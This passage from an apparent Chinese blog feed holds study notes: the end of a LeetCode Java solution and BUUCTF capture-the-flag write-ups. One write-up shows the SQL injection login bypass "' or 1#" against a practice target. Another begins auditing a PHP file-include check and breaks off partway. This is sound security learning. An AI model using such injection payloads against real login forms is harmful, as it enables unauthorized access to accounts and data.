class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>, n = height.length;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">            max = Math.max(max, (right - left) * Math.min(height[left], height[right]));</span><br><span class="line">            <span class="keyword">if</span>(height[left] &lt; height[right]) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>执行用时: <strong>4 ms</strong></p></li><li><p>内存消耗: <strong>51.6 MB</strong></p></li></ul><blockquote><p><strong>总结</strong></p><p>其实这道题确实很简单，但是目前来说，思维还是被暴力求解法给困住了，还是得多刷刷多学学。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 刷题笔记——day 2</title>
      <link href="/posts/a7ed6be6/"/>
      <url>/posts/a7ed6be6/</url>
      
        <content type="html"><![CDATA[<h1>BUUCTF 刷题笔记——day 2</h1><h2 id="极客大挑战-2019-EasySQL">[极客大挑战 2019]EasySQL</h2><h3 id="启动靶机-9">启动靶机</h3><ul><li>进入一个黑客背景的登录界面，需要用户名和密码，界面做得挺好看，就是看不到 <code>flag</code> 。</li></ul><p><img src="000.webp" alt=""></p><h3 id="查看源码-3">查看源码</h3><ul><li>看不出什么东西，所以直接浏览器右键查看源码，源码如下</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">                <span class="selector-class">.slickButton3</span> &#123;</span></span><br><span class="line"><span class="css">                        <span class="attribute">margin-right</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="css">                        <span class="attribute">margin-left</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="css">                        <span class="attribute">margin-top</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="css">                        <span class="attribute">margin-bottom</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="css">                <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="css">                <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">border</span>: solid <span class="number">1px</span> black;</span></span><br><span class="line"><span class="css">                <span class="attribute">background</span>: <span class="number">#111111</span>;</span></span><br><span class="line"><span class="css">                <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="css">                <span class="attribute">transition</span>: box-shadow <span class="number">0.5s</span>;</span></span><br><span class="line"><span class="css">                -webkit-<span class="attribute">transition</span>: box-shadow <span class="number">0.5s</span>;</span></span><br><span class="line"><span class="css">                &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">                <span class="selector-class">.slickButton3</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">box-shadow</span>:<span class="number">4px</span> <span class="number">4px</span> <span class="number">8px</span> <span class="number">#00FFFF</span>;</span></span><br><span class="line"><span class="css">                &#125;</span></span><br><span class="line"><span class="css">                <span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="css">                        <span class="attribute">position</span>:absolute;</span></span><br><span class="line"><span class="css">                        <span class="attribute">left</span>:<span class="number">20px</span>;</span></span><br><span class="line"><span class="css">                        <span class="attribute">top</span>:<span class="number">0px</span>;</span></span><br><span class="line"><span class="css">                &#125;</span></span><br><span class="line"><span class="css">                <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="css">                        <span class="attribute">cursor</span>: default;</span></span><br><span class="line"><span class="css">                &#125;</span></span><br><span class="line"><span class="css">                <span class="selector-class">.input</span>&#123;</span></span><br><span class="line"><span class="css">                        <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="css">                        <span class="attribute">padding</span>: <span class="number">7px</span> <span class="number">0px</span>;</span></span><br><span class="line"><span class="css">                        <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="css">                        <span class="attribute">padding-left</span>:<span class="number">5px</span>;</span></span><br><span class="line"><span class="css">                        -webkit-<span class="attribute">box-shadow</span>: inset <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">075</span>);</span></span><br><span class="line"><span class="css">                        <span class="attribute">box-shadow</span>: inset <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">075</span>);</span></span><br><span class="line"><span class="css">                        -webkit-<span class="attribute">transition</span>: border-color ease-in-out .<span class="number">15s</span>,-webkit-box-shadow ease-in-out .<span class="number">15s</span>;</span></span><br><span class="line"><span class="css">                        -o-<span class="attribute">transition</span>: border-color ease-in-out .<span class="number">15s</span>,box-shadow ease-in-out .<span class="number">15s</span>;</span></span><br><span class="line"><span class="css">                        <span class="attribute">transition</span>: border-color ease-in-out .<span class="number">15s</span>,box-shadow ease-in-out .<span class="number">15s</span></span></span><br><span class="line"><span class="css">                &#125;</span></span><br><span class="line"><span class="css">                <span class="selector-class">.input</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="css">                        <span class="attribute">border-color</span>: <span class="number">#808000</span>;</span></span><br><span class="line"><span class="css">                        <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">8px</span> <span class="number">#7CFC00</span>;</span></span><br><span class="line"><span class="css">                &#125;                </span></span><br><span class="line"><span class="css">        </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>用户登陆<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">background</span>=<span class="string">&quot;./image/background.jpg&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-repeat:no-repeat ;background-size:100% 100%; background-attachment: fixed;&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;check.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-family:arial;color:white;font-size:20px;text-align:center;font-family:KaiTi;&quot;</span>&gt;</span>我是cl4y，是一个WEB开发程序员，最近我做了一个网站，快来看看它有多精湛叭！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-family:arial;color:white;font-size:20px;text-align:center;&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;font-family:arial;color:white;font-size:20px;text-align:center;&quot;</span>&gt;</span>密  码：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align:center;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span> <span class="attr">class</span>=<span class="string">&quot;slickButton3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute;bottom: 0;width: 99%;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font:italic 15px Georgia,serif;color:white;&quot;</span>&gt;</span> Syclover @ cl4y<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>&lt;style&gt;</code> 标签部分可以不看，他在 <code>html</code> 中负责定义页面样式，对解题没有帮助。需要注意的是注意下面 <code>&lt;body&gt;</code> 标签内，有一个占用很大部分的 <code>&lt;form&gt;</code> 标签。<code>&lt;form&gt;</code> 用于创建表单，也就是说，我们的登录信息应该会通过这里传递。</li><li>可以注意到，<code>&lt;form&gt;</code> 标签内有两个参数，他们表示用 <code>GET</code> 方法提交到 <code>check.php</code> 页面。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;check.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​<code>method</code> 负责设置提交的方法，一共有两种方法：<code>POST</code> 方法 和 <code>GET</code> 方法。</p><blockquote><p><code>POST</code> 方法</p><ul><li>POST数据放在body（POST提交的数据则放在实体数据），POST请求数据不能被缓存下来</li><li>POST请求参数不会被保存在浏览器历史或 web 服务器日志中。</li><li>POST请求没有长度限制</li></ul><p><code>GET</code> 方法</p><ul><li>通过GET提交数据，用户名和密码将明文出现在URL上，因为登录页面有可能被浏览器缓存,GET请求请提交的数据放置在HTTP请求协议头</li><li>或者其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击,所以不安全</li><li>GET请求有长度限制</li></ul></blockquote><ul><li>在网页中测试输入用户名和密码分别为 <code>1</code> 和 <code>123</code> ，可以在地址栏中看到我们提交的数据，并且可以发现，我们所在的页面就是 <code>check.php</code> 。且参数名分别为 <code>username</code> 和 <code>password</code> 。</li></ul><p><img src="001.webp" alt=""></p><p><img src="002.webp" alt=""></p><ul><li>显然，接下来我们就需要使用 <code>SQL注入</code> ，那么，什么是 <code>SQL注入</code> 呢？</li></ul><blockquote><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p><div align="right">—— 百度百科</div></blockquote><h3 id="SQL注入">SQL注入</h3><ul><li>在数据库查询的时候，一般会使用如下语句：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&amp;username&amp;&#x27;</span><span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;&amp;password&amp;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>where</code> <strong>用于规定选择的标准。</strong></p><p><code>&amp;username&amp;</code> 和 <code>&amp;password&amp;</code> 分别为用户传入的用户名和密码，如果能在数据库中查询到则返回真值并通过验证。因此，其实只需要让 <code>username='&amp;username&amp;'and password='&amp;password&amp;'</code> 语句为真即可。</p><ul><li>如果我们在用户名处输入类似于 <code>' or 1</code> 这样的字符串，那么查询语句就会变成这个样子：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="string">&#x27;and password=&#x27;</span><span class="operator">&amp;</span>password<span class="operator">&amp;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>但是这里就会多出一个单引号，服务器将会报错，因此这里我们需要用到注释，用 <code>#</code> 将后面的代码注释掉，就能正确返回真值了。用户名改为 <code>' or 1#</code> 于是我们得到如下代码：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>#<span class="string">&#x27;and password=&#x27;</span><span class="operator">&amp;</span>password<span class="operator">&amp;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>当然，也可以用类似的方法修改密码。</p></blockquote><h3 id="开始夺旗（Flag）-3">开始夺旗（Flag）</h3><ul><li>在用户名处输入 <code>' or 1#</code> ，由于密码不能为空，因此顺便输入一个密码。登录即可。</li></ul><p><img src="003.webp" alt=""></p><p><img src="004.webp" alt=""></p><blockquote><p>也可以直接修改 <code>url</code> ，但是空格需要使用 <code>+</code> 表示。</p><p><img src="005.webp" alt=""></p><p>可以看到 <code>'</code> 和 <code>#</code> 被自动替换为了转义码 <code>%27</code> 和 <code>%23</code> ，我们在输入时也可以直接使用转义码输入。</p></blockquote><p>自此，夺旗成功。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 刷题笔记——day 1</title>
      <link href="/posts/3ee43a5c/"/>
      <url>/posts/3ee43a5c/</url>
      
        <content type="html"><![CDATA[<h1>BUUCTF 刷题笔记——day 1</h1><h2 id="HCTF-2018-WarmUp">[HCTF 2018]WarmUp</h2><h3 id="启动靶机-7">启动靶机</h3><ul><li>只有一张大黄猥琐斜眼笑脸出现，查看图片发现图片储存在 <a href="http://SM.MS">SM.MS</a> 图床上（这不重要）。</li></ul><p><img src="000.webp" alt=""></p><h3 id="查看源码">查看源码</h3><ul><li>然后，<code>F12</code> 查看源码，界面如下，可以看到右侧代码框内有一行绿色的耀眼文字。应该是线索？</li></ul><p><img src="001.webp" alt=""></p><p><img src="002.webp" alt=""></p><ul><li>在浏览器地址栏后方加上 <code>/source.php</code> 就可以访问文件。至于为什么，先挖个坑。</li></ul><p><img src="003.webp" alt=""></p><ul><li>回车后我们就会得到以下代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>显然，接下来就要进行代码审计了，那么，什么是代码审计呢？</p><blockquote><p>顾名思义就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。</p><div align="right">—— 百度百科  </div></blockquote></li></ul><h3 id="代码审计-3">代码审计</h3><ul><li>在一开始，我们不难注意到这里定义了一个白名单数组，我们可以访问一下，万一有线索呢~</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br></pre></td></tr></table></figure><ul><li>在浏览器地址栏把 <code>source.php</code> 改成 <code>hint.php</code> 即可，然后可以看到一串字符，虽然不是答案，但是我们得到了一个线索，flag 在 <code>ffffllllaaaagggg</code> 里面。</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="004.webp" alt=""></p><ul><li>返回继续看刚才的代码，最下方有一小块代码，先解决他。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">&amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">&amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><ul><li><p><code>$_REQUEST['file']</code> 不认识是什么，先称他为 ￥</p></li><li><p>if 语句判断三个条件</p><ol><li>￥非空（<code>! empty()</code>）</li><li>￥是字符串（<code>is_string()</code>）</li><li>￥通过 <code>checkFile()</code> 函数且返回 <code>true</code> （<code>emmm::checkFile()</code>）</li></ol></li><li><p>如果￥不满足三大条件程序就会输出这个图片（<code>echo</code>）；而如果程序满足三大条件，程序就会 <code>include</code> 他。</p></li><li><p>不知道 <code>include</code> 干嘛用，但是可以打开这个链接 <a href="https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg">https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg</a> ，发现这就是网页上显示的大黄猥琐斜眼笑脸，显然，￥现在不满足三大条件，而要让网页发生点别的，就得让￥满足，我们先从 <code>checkFile()</code> 函数入手。</p></li><li><p>现在我们分析这个函数</p></li></ul><p><strong>第一个代码块</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依然是 if语句 的判断：如果 <code>$page</code> 满足</p><ol><li>不存在或值为NULL（! isset()）</li><li>不是字符串（!is_string()）</li></ol><p>其中之一，则输出 <code>&quot;you can't see it&quot;</code> 并返回 <code>false</code> 。大问题，我们不能让他执行。</p><p><strong>第二个代码块</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依然是 if语句 的判断：如果 <code>$page</code> 存在于 <code>$whitelist</code> 也就是一开始定义得白名单数组中，就返回 <code>true</code>。这个可以让他执行。</p><p><strong>第三个代码块</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 